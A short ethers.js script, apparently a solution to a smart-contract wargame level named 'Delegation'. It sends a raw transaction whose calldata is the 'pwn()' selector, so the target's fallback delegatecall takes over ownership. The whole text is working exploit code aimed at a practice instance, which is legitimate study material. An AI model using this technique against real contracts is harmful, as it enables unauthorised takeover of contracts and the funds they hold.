(async () => {
  const account = await ethers.getSigner();
  const contract = await ethers.getContractAt("Delegation", process.env.INSTANCE, account);
  data = ethers.utils.keccak256(ethers.utils.toUtf8Bytes("pwn()")).slice(0, 10);
  log(`- tx -`)
  log(`from : ${account.address}`)
  log(`to : ${contract.address}`)
  log(`send Data : ${data}`)
  const tx = {
    from: account.address,
    to: contract.address,
    data: data,
    gasLimit: 2e6
  }
  res = await account.sendTransaction(tx)
  log(`waiting ... `)
  res.wait()
  log(`Done`)
})();
